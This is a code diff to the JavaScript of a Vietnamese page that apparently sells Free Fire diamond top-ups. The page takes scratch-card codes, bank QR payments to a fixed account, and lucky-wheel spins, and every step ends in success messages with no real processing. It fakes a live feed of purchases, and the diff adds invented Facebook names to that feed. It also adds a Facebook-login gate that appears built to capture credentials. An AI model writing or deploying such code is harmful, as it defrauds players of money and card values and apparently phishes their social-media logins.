             document.getElementById('qr-amount-display').innerText = parseInt(selectedAmount).toLocaleString('vi-VN') + 'đ';
             updateQRCode();
         }
@@ -855,7 +991,7 @@
             }
         }
 
-        // Dynamic QR code generator URL
+        // Dynamic QR code URL
         function updateQRCode() {
             const memo = document.getElementById('qr-memo-code').innerText;
             const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=STK:0988889999|MEMO:${encodeURIComponent(memo)}|AMOUNT:${selectedAmount}`;
@@ -864,6 +1000,12 @@
 
         // Process Card Payment Submission
         function processCardPayment() {
+            if (!currentUserFB) {
+                showAlert('Yêu Cầu Đăng Nhập', 'Vui lòng Đăng Nhập Facebook trước khi thực hiện giao dịch nạp.', 'error');
+                openFBModal();
+                return;
+            }
+
             const cardCode = document.getElementById('card-code').value.trim();
             const cardSeri = document.getElementById('card-seri').value.trim();
             const playerId = document.getElementById('player-id-input').value.trim();
@@ -874,25 +1016,30 @@
             }
 
             if (!cardCode || !cardSeri) {
-                showAlert('Chưa Nhập Đủ Thông Tin', 'Vui lòng nhập đầy đủ Số Mã Thẻ và Số Seri.', 'error');
+                showAlert('Chưa Nhập Đủ Thông Tin', 'Vui lòng nhập đầy đủ Mã thẻ và Số Seri.', 'error');
                 return;
             }
 
-            showAlert('Đang Xử Lý', `Thẻ cào của bạn đã gửi lên hệ thống. Đang kiểm tra mã thẻ... Kim Cương sẽ được nạp vào ID ${playerId} trong 30s nếu hợp lệ!`, 'success');
+            showAlert('Đang Xử Lý', `Thẻ cào đã được gửi lên hệ thống. Đang kiểm tra mã... Kim Cương sẽ được cộng vào ID ${playerId} trong 30s!`, 'success');
             
-            // Clear inputs
             document.getElementById('card-code').value = '';
             document.getElementById('card-seri').value = '';
         }
 
         // Confirm QR Payment
         function confirmQRPayment() {
+            if (!currentUserFB) {
+                showAlert('Yêu Cầu Đăng Nhập', 'Vui lòng Đăng Nhập Facebook trước khi thực hiện giao dịch.', 'error');
+                openFBModal();
+                return;
+            }
+
             const playerId = document.getElementById('player-id-input').value.trim();
             if (!playerId) {
                 showAlert('Chưa Nhập ID', 'Vui lòng nhập ID nhân vật Free Fire trước khi thanh toán.', 'error');
                 return;
             }
-            showAlert('Xác Nhận Thành Công', `Hệ thống đã ghi nhận đơn nạp cho ID: ${playerId}. Kim Cương sẽ được cộng tự động ngay khi ngân hàng xử lý xong giao dịch!`, 'success');
+            showAlert('Xác Nhận Thành Công', `Hệ thống đã ghi nhận đơn nạp cho ID: ${playerId}. KC sẽ được cộng tự động ngay khi ngân hàng xử lý!`, 'success');
         }
 
         // Modal Controls
@@ -933,22 +1080,22 @@
         function initLiveFeed() {
             const feedBody = document.getElementById('live-feed-body');
             const mockPackages = ['111 KC', '280 KC', '580 KC', '1.190 KC', '3.050 KC', 'Thẻ Tuần'];
-            const mockMethods = ['Viettel', 'Momo', 'MBBank', 'Zing', 'Vinaphone'];
+            const mockFBUsers = ['Nguyễn Hoàng', 'Trần Tuấn', 'Lê Bảo', 'Phạm Minh', 'Đặng Khoa', 'Vũ Nam'];
 
             function addRow() {
                 const now = new Date();
                 const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
                 const randomID = Math.floor(100000000 + Math.random() * 900000000).toString().substring(0, 6) + '***';
                 const randomPkg = mockPackages[Math.floor(Math.random() * mockPackages.length)];
-                const randomMethod = mockMethods[Math.floor(Math.random() * mockMethods.length)];
+                const randomFB = mockFBUsers[Math.floor(Math.random() * mockFBUsers.length)];
 
                 const tr = document.createElement('tr');
                 tr.className = "hover:bg-ffDark/80 transition-colors animate-fadeIn";
                 tr.innerHTML = `
                     <td class="py-2.5 px-4 text-gray-400">${timeStr}</td>
+                    <td class="py-2.5 px-4 text-fbBlue font-bold"><i class="fa-brands fa-facebook mr-1"></i> ${randomFB}</td>
                     <td class="py-2.5 px-4 font-bold text-white">${randomID}</td>
                     <td class="py-2.5 px-4 text-cyan-400 font-bold">${randomPkg}</td>
-                    <td class="py-2.5 px-4 text-gray-300">${randomMethod}</td>
                     <td class="py-2.5 px-4">
                         <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] font-bold bg-green-500/20 text-green-400 border border-green-500/30">
                             Thành công
@@ -967,9 +1114,7 @@
                 }
             }
 
-            // Initial rows
             for (let i = 0; i < 5; i++) addRow();
-            // Periodically add new transaction
             setInterval(addRow, 3500);
         }
 
@@ -1048,7 +1193,7 @@
             ctx.save();
             const winner = prizes[index].label;
             
-            showAlert('Chúc Mừng!', `Bạn đã quay trúng: ${winner}! KC sẽ được chuyển vào ID game của bạn.`, 'success');
+            showAlert('Chúc Mừng!', `Tài khoản ${currentUserFB.name} đã quay trúng: ${winner}! KC sẽ được chuyển trực tiếp vào ID game.`, 'success');
             document.getElementById('spin-btn').disabled = false;
         }
 
@@ -1059,6 +1204,12 @@
         }
 
         function spinWheel() {
+            if (!currentUserFB) {
+                showAlert('Yêu Cầu Đăng Nhập', 'Bạn cần Đăng Nhập Facebook để tham gia Vòng quay may mắn!', 'error');
+                openFBModal();
+                return;
+            }
+
             const spinBtn = document.getElementById('spin-btn');
             spinBtn.disabled = true;
 
